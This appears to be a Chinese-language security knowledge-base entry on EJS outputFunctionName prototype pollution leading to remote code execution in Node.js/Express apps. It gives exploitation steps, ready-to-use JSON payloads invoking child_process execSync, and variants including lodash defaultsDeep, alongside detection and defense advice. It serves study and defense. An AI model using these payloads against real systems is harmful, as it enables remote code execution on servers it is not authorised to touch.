---
id: web-nodejs-prototype-pollution-ejs-outputfunctionname-rce
title: EJS outputFunctionName 原型污染注入：拼接进模板函数体，语句逃逸执行 child_process
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: ejs-outputfunctionname-prototype-pollution-rce
tags:
- nodejs
- prototype-pollution
- ejs
- express
- rce
- template-engine
- javascript
cve:
- CVE-2019-10744
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V501
  verified_at: '2026-11-11T02:18:40+08:00'
  notes: 已对照原文核对：EJS generateSource 将 outputFunctionName 原样拼进 var <名> = __append; 再交 new Function，两种 payload（a=1;return...// 与 _tmp1;...;var __tmp2）、Hardjs 场景 defaultsDeep 合并 6 条记录触发 CVE-2019-10744 污染后 render 触发 RCE 均与原文及图05一致；CVE-2019-10744 与原文引用一致；未实测。
url: /docs/web/nodejs/prototype-pollution/web-nodejs-prototype-pollution-ejs-outputfunctionname-rce/
draft: false
kb_aliases:
- EJS outputFunctionName
- outputFunctionName 原型污染
- EJS 模板 RCE
- Express EJS 原型链 RCE
- 模板函数体注入
---

## 一句话结论

EJS 编译模板时若发现 `opts.outputFunctionName`，会把它原样拼进 `var <outputFunctionName> = __append;` 并交给 `new Function` 编译；攻击者通过原型污染写入 `Object.prototype.outputFunctionName`，把值构造成 `a=1;return <命令执行代码>//`，即可在模板渲染时执行任意 Node 代码，且不需要 `client=true` 等其他选项。

## 原理

- EJS 的 `generateSource` 在生成模板函数体时会加入固定前缀：`var __output = [], __append = __output.push.bind(__output);`；如果 options 里有 `outputFunctionName`，再追加一行 `var <输出名> = __append;`。
- `outputFunctionName` 被当作**标识符源码**直接字符串拼接，没有任何合法性校验或转义。由于 options 会沿原型链读取，污染 `Object.prototype.outputFunctionName` 后，即使路由没有显式传入该选项，EJS 也会读到攻击者的值。
- 攻击者的值以 `a=1;return <payload>//` 形式注入后，生成代码变为：
  `var a=1;return <payload>// = __append;`
  末尾 `//` 注释掉 ` = __append;`，`return` 让模板函数立即返回 payload 的执行结果，从而跳过模板正文。
- payload 处在 `new Function` 创建的全局作用域，没有模块作用域的 `require`；使用 `process.mainModule.require('child_process')` 或 `global.process.mainModule.constructor._load('child_process')` 调用命令执行。
- 与 EJS `escapeFunction` gadget 的差异：`outputFunctionName` 在模板编译阶段就被拼进函数体，服务端渲染路径即可触发，不依赖 `client=true`；`escapeFunction` 则需要 client 模式等条件配合。两者可以互相替代，取决于目标 EJS 版本的代码路径。
- 只要目标应用存在“用户 JSON → 深合并/递归赋值 → `Object.prototype` 被写”的入口，且使用 EJS 渲染页面，该链即可成立；污染是进程级的，一次成功对所有后续渲染生效。

## 触发条件

- Node.js/Express 应用使用 EJS 作为模板引擎，且版本会把 `outputFunctionName` 原样拼进模板函数体（旧版本普遍如此；原文未标注具体版本区间）。
- 应用存在原型污染入口（`lodash.merge`/`defaultsDeep` 旧版本、手写递归 merge、`clone` 封装等），且用户 JSON 未过滤危险键。
- 模板渲染的 options 对象继承 `Object.prototype`，使污染值能被 EJS 读到。
- 攻击者能触发至少一次模板渲染（首页、登录页、错误页均可）。
- 若入口需要登录/管理员权限，需先取得可用会话（例如借助大小写过滤绕过注册出 ADMIN）。

## 利用步骤

1. 确认污染入口：提交 `{"__proto__":{"x":"y"}}` 或 `{"constructor":{"prototype":{"x":"y"}}}`，观察后续对象是否继承 `x`。
2. 构造 outputFunctionName payload（两种常见写法）：
   - `a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//`
   - `_tmp1;global.process.mainModule.require('child_process').exec('id');var __tmp2`（保留后续 `= __append` 的语法完整性）
3. 通过污染入口提交 JSON：
   ```json
   {"__proto__":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//"}}
   ```
   若 `__proto__` 被过滤，改用 `{"constructor":{"prototype":{"outputFunctionName":"..."}}}`。
4. 访问任意 EJS 渲染页面/接口，模板编译时执行 payload；命令输出可能出现在响应中，或无回显时改用外带/写文件/反弹 shell。
5. 若命令需要引号，按 JSON 规则转义；无回显时优先用 `execSync` 返回值拼进模板输出，或写文件到 Web 可访问目录。
6. 成功后重启 Node 进程可清除污染；排查是否已写入持久化。

## PoC

```json
{"__proto__":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//"}}
```

`constructor.prototype` 形式：

```json
{"constructor":{"prototype":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('id').toString()//"}}}
```

拼接后的模板函数体示意：

```javascript
var __output = [], __append = __output.push.bind(__output);
var a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()// = __append;
```

说明：PoC 依据 EJS `generateSource` 的拼接逻辑构造，未在目标环境复跑；`cat /flag` 换成目标环境可执行的命令。

## 变体与关联

- 变体（多请求合并场景）：数据先分多条存入数据库，再由 `lodash.defaultsDeep` 合并时触发 CVE-2019-10744 污染；需要凑够合并阈值（例如 6 条）后再访问合并接口与渲染页。该场景的 payload 常写成 `{"type":"test","content":{"constructor":{"prototype":{"outputFunctionName":"..."}}}}` 的嵌套形式。
- 变体：EJS 还可被 `escapeFunction`、`localsName`、`destructuredLocals` 等选项 gadget 利用；不同版本可用字段不同。
- 关联：[[web-nodejs-prototype-pollution-lodash-ejs-escapefunction-rce]]（同原语、不同 gadget，需 `client=true`）；[[web-nodejs-prototype-pollution-lodash-template-sourceurl-rce]]（lodash.template 的 sourceURL gadget）；[[web-generic-auth-uppercase-after-filter-dotless-i-admin-bypass]]（本链前置：注册出 ADMIN 进入受保护接口）；[[web-nodejs-prototype-pollution-merge-json-parse]]（污染原语基础）。
- 边界：EJS 版本修复/过滤了 outputFunctionName、模板引擎改为预编译或沙箱、污染入口被阻断、渲染不继承原型时失效。

## 检测与防御

- 升级 EJS 与 lodash 到修复版本；不要把用户可控对象直接作为模板 options。
- 对进入深合并的用户 JSON 递归拒绝 `__proto__`、`constructor`、`prototype`；使用 `Object.create(null)`/`Map` 接收外部数据。
- 模板层：在渲染前对 options 做键白名单；禁用不必要的 EJS 动态选项；使用沙箱化模板引擎或预编译模板。
- 检测：请求体中出现 `outputFunctionName`、`escapeFunction`、`sourceURL` 与 `__proto__`/`constructor` 的组合；Node 进程异常 `child_process` 调用；渲染接口响应中出现命令输出特征。
- 响应：重启 Node 进程清除污染，轮换密钥/会话，检查 WebShell、持久化与横向移动痕迹。
